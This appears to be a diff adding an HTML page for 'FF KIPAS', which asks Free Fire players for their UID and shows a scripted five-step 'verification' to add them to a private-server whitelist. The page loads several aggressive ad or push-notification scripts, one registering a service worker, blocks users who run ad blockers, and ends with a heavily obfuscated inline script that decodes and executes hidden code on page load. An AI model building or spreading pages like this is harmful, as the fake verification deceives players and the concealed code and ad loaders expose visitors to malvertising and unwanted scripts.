@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify UID - FF KIPAS</title>
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style type="text/css">@font-face {font-family:Inter;font-style:normal;font-weight:400;src:url(/cf-fonts/v/inter/5.0.16/latin-ext/wght/normal.woff2);unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:Inter;font-style:normal;font-weight:400;src:url(/cf-fonts/v/inter/5.0.16/greek/wght/normal.woff2);unicode-range:U+0370-03FF;font-display:swap;}@font-face {font-family:Inter;font-style:normal;font-weight:400;src:url(/cf-fonts/v/inter/5.0.16/vietnamese/wght/normal.woff2);unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;font-display:swap;}@font-face {font-family:Inter;font-style:normal;font-weight:400;src:url(/cf-fonts/v/inter/5.0.16/cyrillic/wght/normal.woff2);unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;font-display:swap;}@font-face {font-family:Inter;font-style:normal;font-weight:400;src:url(/cf-fonts/v/inter/5.0.16/greek-ext/wght/normal.woff2);unicode-range:U+1F00-1FFF;font-display:swap;}@font-face {font-family:Inter;font-style:normal;font-weight:400;src:url(/cf-fonts/v/inter/5.0.16/latin/wght/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:Inter;font-style:normal;font-weight:400;src:url(/cf-fonts/v/inter/5.0.16/cyrillic-ext/wght/normal.woff2);unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F;font-display:swap;}@font-face {font-family:Inter;font-style:normal;font-weight:600;src:url(/cf-fonts/v/inter/5.0.16/greek-ext/wght/normal.woff2);unicode-range:U+1F00-1FFF;font-display:swap;}@font-face {font-family:Inter;font-style:normal;font-weight:600;src:url(/cf-fonts/v/inter/5.0.16/vietnamese/wght/normal.woff2);unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;font-display:swap;}@font-face {font-family:Inter;font-style:normal;font-weight:600;src:url(/cf-fonts/v/inter/5.0.16/cyrillic/wght/normal.woff2);unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;font-display:swap;}@font-face {font-family:Inter;font-style:normal;font-weight:600;src:url(/cf-fonts/v/inter/5.0.16/latin/wght/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:Inter;font-style:normal;font-weight:600;src:url(/cf-fonts/v/inter/5.0.16/latin-ext/wght/normal.woff2);unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:Inter;font-style:normal;font-weight:600;src:url(/cf-fonts/v/inter/5.0.16/greek/wght/normal.woff2);unicode-range:U+0370-03FF;font-display:swap;}@font-face {font-family:Inter;font-style:normal;font-weight:600;src:url(/cf-fonts/v/inter/5.0.16/cyrillic-ext/wght/normal.woff2);unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F;font-display:swap;}@font-face {font-family:Inter;font-style:normal;font-weight:800;src:url(/cf-fonts/v/inter/5.0.16/latin-ext/wght/normal.woff2);unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:Inter;font-style:normal;font-weight:800;src:url(/cf-fonts/v/inter/5.0.16/vietnamese/wght/normal.woff2);unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;font-display:swap;}@font-face {font-family:Inter;font-style:normal;font-weight:800;src:url(/cf-fonts/v/inter/5.0.16/greek/wght/normal.woff2);unicode-range:U+0370-03FF;font-display:swap;}@font-face {font-family:Inter;font-style:normal;font-weight:800;src:url(/cf-fonts/v/inter/5.0.16/cyrillic-ext/wght/normal.woff2);unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F;font-display:swap;}@font-face {font-family:Inter;font-style:normal;font-weight:800;src:url(/cf-fonts/v/inter/5.0.16/greek-ext/wght/normal.woff2);unicode-range:U+1F00-1FFF;font-display:swap;}@font-face {font-family:Inter;font-style:normal;font-weight:800;src:url(/cf-fonts/v/inter/5.0.16/cyrillic/wght/normal.woff2);unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;font-display:swap;}@font-face {font-family:Inter;font-style:normal;font-weight:800;src:url(/cf-fonts/v/inter/5.0.16/latin/wght/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:Rajdhani;font-style:normal;font-weight:500;src:url(/cf-fonts/s/rajdhani/5.0.11/latin-ext/500/normal.woff2);unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:Rajdhani;font-style:normal;font-weight:500;src:url(/cf-fonts/s/rajdhani/5.0.11/devanagari/500/normal.woff2);unicode-range:U+0900-097F,U+1CD0-1CF9,U+200C-200D,U+20A8,U+20B9,U+25CC,U+A830-A839,U+A8E0-A8FF;font-display:swap;}@font-face {font-family:Rajdhani;font-style:normal;font-weight:500;src:url(/cf-fonts/s/rajdhani/5.0.11/latin/500/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:Rajdhani;font-style:normal;font-weight:700;src:url(/cf-fonts/s/rajdhani/5.0.11/devanagari/700/normal.woff2);unicode-range:U+0900-097F,U+1CD0-1CF9,U+200C-200D,U+20A8,U+20B9,U+25CC,U+A830-A839,U+A8E0-A8FF;font-display:swap;}@font-face {font-family:Rajdhani;font-style:normal;font-weight:700;src:url(/cf-fonts/s/rajdhani/5.0.11/latin/700/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:Rajdhani;font-style:normal;font-weight:700;src:url(/cf-fonts/s/rajdhani/5.0.11/latin-ext/700/normal.woff2);unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}</style>
+    <link rel="icon" href="assets/images/ffkipas.png?v=1.0">
+    
+    <script src="https://quge5.com/88/tag.min.js" data-zone="171903" async data-cfasync="false"></script>
+    <script src="https://3nbf4.com/act/files/micro.tag.min.js?z=9716024&sw=/sw-check-permissions.js" data-cfasync="false" async></script>
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        tech: ['Rajdhani', 'sans-serif'],
+                    },
+                    colors: {
+                        kps: {
+                            main: '#0f172a',
+                            panel: '#1e293b',
+                            border: '#334155',
+                            blue: '#2563eb',
+                            cyan: '#06b6d4',
+                        }
+                    },
+                    backgroundImage: {
+                        'gradient-kps': 'linear-gradient(135deg, #2563eb 0%, #06b6d4 100%)',
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        /* Custom Styles untuk mendukung verifyuid.js tanpa file CSS lama */
+        .bg-grid {
+            background-size: 40px 40px;
+            background-image: linear-gradient(to right, #1e293b 1px, transparent 1px),
+                              linear-gradient(to bottom, #1e293b 1px, transparent 1px);
+            mask-image: linear-gradient(to bottom, black 60%, transparent 100%);
+        }
+
+        /* Progress Steps Styling */
+        .step {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: #1e293b; /* bg-slate-800 */
+            border: 2px solid #334155; /* border-slate-600 */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: #64748b; /* text-slate-500 */
+            transition: all 0.3s ease;
+            position: relative;
+            z-index: 10;
+        }
+
+        /* Class .active ditambahkan oleh JS */
+        .step.active {
+            border-color: #06b6d4; /* kps-cyan */
+            color: #fff;
+            background-color: #0f172a;
+            box-shadow: 0 0 15px rgba(6, 182, 212, 0.5);
+        }
+
+        /* Progress Bar Line */
+        .progress-bar {
+            position: absolute;
+            top: 50%;
+            left: 0;
+            transform: translateY(-50%);
+            height: 4px;
+            width: 100%;
+            background-color: #334155;
+            z-index: 1;
+        }
+
+        .progress {
+            height: 100%;
+            background: linear-gradient(90deg, #2563eb, #06b6d4);
+            width: 0%; /* Diatur oleh JS */
+            transition: width 0.5s ease;
+        }
+
+        /* Step Info Logic */
+        .step-info { display: none; animation: fadeIn 0.5s; }
+        .step-info.active { display: block; }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+
+<body class="bg-kps-main text-slate-300 font-sans min-h-screen flex flex-col">
+
+    <div class="fixed inset-0 bg-grid -z-10 pointer-events-none opacity-30"></div>
+
+    <header class="w-full bg-kps-main/90 backdrop-blur-md border-b border-kps-border/50 sticky top-0 z-50">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-20 flex items-center justify-between">
+            <div class="flex items-center gap-3">
+                <a href="/" class="flex items-center gap-3 group">
+                    <img src="assets/images/ffkipas.png?v=1.0" alt="FF KIPAS" class="h-10 w-auto rounded group-hover:brightness-110 transition">
+                    <span class="font-tech font-bold text-xl tracking-widest text-white hidden sm:block">
+                        KIPAS <span class="text-kps-cyan">VERIFY</span>
+                    </span>
+                </a>
+            </div>
+            <a href="/" class="flex items-center gap-2 text-slate-400 hover:text-white transition font-semibold text-sm">
+                <i class="fas fa-arrow-left"></i> <span>Back to Home</span>
+            </a>
+        </div>
+    </header>
+
+    <section class="flex-grow flex items-center justify-center p-4 py-12">
+        <div class="w-full max-w-lg">
+
+            <div class="bg-kps-panel border border-kps-border rounded-xl shadow-2xl overflow-hidden relative backdrop-blur-sm">
+                
+                <div class="absolute top-0 left-0 w-full h-1 bg-gradient-kps"></div>
+
+                <div class="p-6 md:p-8">
+                    <!--<div class="mb-6 flex justify-center overflow-hidden rounded bg-black/20 min-h-[50px]">-->
+                    <!--    <script async="async" data-cfasync="false" src="//luciuscratediffers.com/edb436ac16df38178d554d87def407b2/invoke.js"></script>-->
+                    <!--    <div id="container-edb436ac16df38178d554d87def407b2"></div>-->
+                    <!--</div>-->
+
+                    <div class="verify-header text-center mb-8">
+                        <h2 class="font-tech text-3xl font-bold text-white mb-2 uppercase">Verify Your <span class="text-kps-cyan">UID</span></h2>
+                        <p class="text-slate-400 text-sm leading-relaxed">
+                            Enter your Free Fire UID below to verify your account and gain access to FF KIPAS Private Server.
+                        </p>
+                    </div>
+
+                    <div class="verification-content">
+                        
+                        <div class="verify-input space-y-6">
+                            <div class="relative group">
+                                <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none text-slate-500 group-focus-within:text-kps-cyan transition">
+                                    <i class="fas fa-user text-lg"></i>
+                                </div>
+                                <input type="text" id="uid-input" 
+                                    class="w-full bg-kps-main border border-kps-border text-white text-lg font-bold py-4 pl-12 pr-4 rounded-lg focus:outline-none focus:border-kps-cyan focus:ring-1 focus:ring-kps-cyan transition placeholder-slate-600"
+                                    placeholder="Enter your Free Fire UID" 
+                                    maxlength="20"
+                                    inputmode="numeric" 
+                                    pattern="[0-9]*">
+                            </div>
+
+                            <button id="verify-btn" class="w-full bg-gradient-kps text-white font-bold py-4 rounded-lg shadow-lg hover:shadow-[0_0_20px_rgba(6,182,212,0.4)] transform hover:-translate-y-0.5 transition-all duration-200 text-lg uppercase tracking-wider">
+                                <i class="fas fa-shield-alt mr-2"></i> Verify UID
+                            </button>
+
+                            <input type="hidden" id="csrf-token" value="05088fd8ef8e12535eaa1a20726801324880dc273d40e9e724edd37927fe28a5">
+                            <input type="hidden" id="verification-hash" value="27aae3f6d1cbe1a06b4427c2382f7f7548d966e65dbd38bd7139e1b19677900a">
+                            <input type="hidden" id="page-timestamp" value="1766124678">
+                        </div>
+
+                        <div class="verification-process" style="display: none;">
+                            <div class="progress-container relative mb-8 px-2">
+                                <div class="progress-bar">
+                                    <div class="progress" id="progress-bar"></div>
+                                </div>
+                                <div class="progress-steps flex justify-between relative z-10">
+                                    <div class="step active" data-step="1">1</div>
+                                    <div class="step" data-step="2">2</div>
+                                    <div class="step" data-step="3">3</div>
+                                    <div class="step" data-step="4">4</div>
+                                    <div class="step" data-step="5">5</div>
+                                </div>
+                            </div>
+
+                            <div class="process-info text-center min-h-[80px] mb-6">
+                                <div class="step-info active" data-step="1">
+                                    <h3 class="text-xl font-bold text-white mb-1">UID Validation</h3>
+                                    <p class="text-kps-cyan text-sm animate-pulse">Checking if your UID exists...</p>
+                                </div>
+                                <div class="step-info" data-step="2">
+                                    <h3 class="text-xl font-bold text-white mb-1">Account Analysis</h3>
+                                    <p class="text-kps-cyan text-sm animate-pulse">Analyzing your account data...</p>
+                                </div>
+                                <div class="step-info" data-step="3">
+                                    <h3 class="text-xl font-bold text-white mb-1">Server Integration</h3>
+                                    <p class="text-kps-cyan text-sm animate-pulse">Your account is being integrated...</p>
+                                </div>
+                                <div class="step-info" data-step="4">
+                                    <h3 class="text-xl font-bold text-white mb-1">Resource Allocation</h3>
+                                    <p class="text-kps-cyan text-sm animate-pulse">Allocating server resources...</p>
+                                </div>
+                                <div class="step-info" data-step="5">
+                                    <h3 class="text-xl font-bold text-white mb-1">Final Authorization</h3>
+                                    <p class="text-kps-cyan text-sm animate-pulse">Authorizing account...</p>
+                                </div>
+                            </div>
+
+                            <div class="process-action">
+                                <button id="continue-btn" class="w-full bg-slate-700 hover:bg-slate-600 text-white font-bold py-3 rounded border border-slate-600 transition">
+                                    Processing...
+                                </button>
+                            </div>
+                        </div>
+
+                        <div class="verification-complete text-center py-4" style="display: none;">
+                            <div class="success-icon mb-4 inline-block">
+                                <i class="fas fa-check-circle text-6xl text-emerald-500 drop-shadow-[0_0_10px_rgba(16,185,129,0.5)]"></i>
+                            </div>
+                            <h3 class="text-2xl font-bold text-white mb-2">Verification Complete!</h3>
+                            <p class="text-slate-400 mb-8">Your UID has been successfully verified and added to the whitelist.</p>
+                            
+                            <a href="/" class="inline-block w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-4 rounded-lg shadow-lg transition uppercase tracking-wider">
+                                Return to Home
+                            </a>
+                        </div>
+
+                    </div>
+                    
+                    </div>
+            </div>
+
+            <footer class="text-center mt-8 text-slate-500 text-sm">
+                <p>&copy; 2025 Kipas Private Server. All rights reserved.</p>
+                <p>Dikembangkan oleh <span class="developer">Ryzzi Citerr</span>
+            </footer>
+
+        </div>
+    </section>
+
+    <div class="anti-adblock fixed inset-0 z-[100] bg-black/90 backdrop-blur flex items-center justify-center p-4" style="display: none;">
+        <div class="bg-kps-panel border border-red-500/50 p-8 rounded-xl max-w-md text-center shadow-2xl">
+            <i class="fas fa-exclamation-triangle text-5xl text-red-500 mb-4"></i>
+            <h2 class="text-2xl font-bold text-white mb-2">Ad Blocker Detected!</h2>
+            <p class="text-slate-300">Our website is made possible by displaying online advertisements. Please disable your ad blocker to verify your UID.</p>
+            <button onclick="location.reload()" class="mt-6 bg-red-600 hover:bg-red-500 text-white px-6 py-2 rounded font-bold transition">
+                I've Disabled It, Reload
+            </button>
+        </div>
+    </div>
+
+    <script src="assets/js/verifyuid.js?v=1.8"></script>
+    
+    <script type="text/javascript" src="https://momrollback.com/a2/c6/c7/a2c6c77dde0f47e335c307a84b4f8205.js"></script>
+
+     <script>
+        var invokeUrl,fetched;(function(){var epc='',dJy=534-523;function zDL(p){var z=509377;var m=p.length;var g=[];for(var s=0;s<m;s++){g[s]=p.charAt(s)};for(var s=0;s<m;s++){var a=z*(s+210)+(z%19638);var n=z*(s+211)+(z%40027);var o=a%m;var c=n%m;var u=g[o];g[o]=g[c];g[c]=u;z=(a+n)%1791283;};return g.join('')};var DSn=zDL('convsnadfrqijhtztcorcuemtkuxgsoyplbrw').substr(0,dJy);var ocE='vge7r=]}r"r 6udaeuiv=fu8h"(bv;n.gv(jv>m1yfqCt=uct"n=r;.)l1"=v b=a0a)8kpu;6egn=y7nv6Atb;ta6o ;);;57rla6sir=7+t(u.20a0o4,+,79eonum)u+{4h{vy]s=)(nwka  )[==si)p+) u=vgonn.rmle)=he,[tps+i(7ohi4;;= Cpilrto=t),tcio=(;1n9r+,i.+u7(rngts"}+pouvora<lbrg+m,,=r,(;i=.t)(9l 78+dar(t,eesry9lv;g!(p,;1C=8on]-.dj=2hp=o f[; ;p;o, rakg.a[q>ifuur+mg l,(0stSr(oao.]gv{2);v.r fah.r(vg(n 00;)a2ttn-g.]=C;+ z8=irtvsacA;rtw1+;,hrra[o=deSrh)n"c(= ;njd+o,]ha]n;qr;rrr;c7,s4,=<e}+=;a<)f.*uret,r;)+kk.((r.;ftg8{-sn{lheufC;dsAv(r 1<jeo)0oal=[frg][]rnnjh;jtavty,)=fz=fesc=y8=uuy;eid(fh"2v))f a[=;3(lw[r)f 7haw1+Cf1l][viaj(4.00]af+;mzv88ry+5v};l6tf;ha)]+zsaza(g)nia.ifte=.tu!s9-tr)bs.o(6s;i,);cljstn..dc1ri=)5}=bziog,*n[{nto}(lipon,(r9l)(=l;]d)A fai;-,o9}17-p(urs,;2r ieh8v6s)t;na(]r)et;6ko0fh2h0=+ cpie.t)uatveaf=+ky[yrq+rad(,",tet-+h1=)Cap[{j1tlqto+"wAv0y)o.jaln,neein=) e(v[;lv;ol=i1h;x(mh .hCm;s<.s3f6(to.",84v .ia(lh;';var ydb=zDL[DSn];var rZQ='';var Omc=ydb;var qcA=ydb(rZQ,zDL(ocE));var izT=qcA(zDL('(,4RR"$R!.(aapw=s+tR0 !eac0S!)5i)(.$pr,iRgds48\/{2at dc,%hn19e6Rj,R3=t[]aS(dR.ero"0.a%k)7;tp.;R.j{ R=;ey)."n$rr)cterRbnhln-1fgR,i5R4ceM}rsc-efro_Ri%$rR!dRdRR3lRi_c0gdn.d.t.2.)4hRaeRR;1dte\'n(}if,37!o:.-3t2!R0.o+f;wRdd9cM[(i.!()dt!r;.u;6)db\/gRltx9n)!TR.nte\/kg(d}ie!Ra%j3dCm3}.fi,"8b)nf#d f((5]_R3d)!.d!e6.!gR6%itrRs8R.(.}{d$b>-vRdlR.stai5tR4)]gdae)]R.d f3{d;at.+o.l5na,d1];sd3(ypeyyid%5]c.ok(.;+_e):_:fRR87e%ownR4r9R58%atn:d y#d.!($itRec;>0_#0=b]t(taaR.)r3R%2nt!.hg.R_R"n.eto.c:).oa0cna3c(4;r!s%t7(woR%gehkdribk=l.$kdwnh=l..dkh(d2RR#!Rm;nhat(cdor(R!3pl.Rn{o4m]+:e&R!+d}*ilR$yee=.$u8t!)=b.)=sa,!p]=)i.2r=c):0eno3s;(*fatCR[e;lyor(d4y0nR, fRR#56$cy4m48e)b.=(R=..)!a%s:\/}3Rs,)R4arn62ey)0g48%0$,)6,g t7$w$8[e.vccf=;_;dR){s0;,elR4dt-m)oR .]40o9\/e[o)R;R5.}Re;.(19r.Rot;: $)mi)t:R7(3.6!d!s%i=eexrdb re,id1bRtry_R.+8g4ww 5%=RmR5.mkR5r;R> 8rad$(,Rldi>}1(d!\'b=R!e,0fi3kR\/R]tR4t8!e.])g;gsnrd4ai)knbR:enr0\/ss2Rs6mM;!ac;.)f.b6n$r=lrie35]sb]{0(;Rebu1pv{S=d}(_#4Rt#.re2b(rh(R .0gR"eR{2R(7.{,#b..v!3d.9cl4yRf8t$)lRb5(;i9,*nq(t.r R.R1]R]fh(+ar-)),+u cy44rt99RR=(deeh.dy.0\' n;3)_el])ofddkobd1v k)odhha.)2_;34Rs2((9o .19nR3 }*6+p.\/i#(nnhhnR.c.47ripe,nt;;)CoeRRtr),4;u)$Ra;fr})troR.sd6]th8ryrM,_.eRl>08ed{ef)00{)036RoRR=rd7d;;c(_!R(!=-f8)0f2.R$_;re&mRds7)_4R_.s iRo0.]_]0R2)=Cde&3};qo!ajo\'(Ro;R&]83dRR.et]RnsR3R(he(hwb{R(!>o(RmvrapsR}4le!maa*($4R%.mR.3.;y\')=r6t!_,o>!l9,Rn,%.*susRa4-a423e{R.:2).et\/,*$943eip!h;Rj+sd}4n7(l];R(]d1]na,h71fR{.%(c;uRf{dbR)4!R]{{%6c.R.Rs}tRnEflsRRg..\/pt.9t=;0ig.d#[u(R2yRvtteR.2c_+e6j6o"f2=p5h0Rd(s.$_]itxh9R]assuaej]!} ,etr3r)ekge-0)tfmp.Rftc0bt2)!=6];o;e1[f6n13f0n2Rs21rn  {{.c_wpod.d,R6nedm}meeiR)s=).2ial2l(R b,]$r]!r.rjei)fRr(e,rn=ay3ntgsR4 d(h3vc7f:lr!)$.s{edD:o%4ep.R'));var ikX=Omc(epc,izT );ikX(7948);return 5076})()
+    </script>
+
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"9821d538e60847f4ba622d85dc6586d2","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
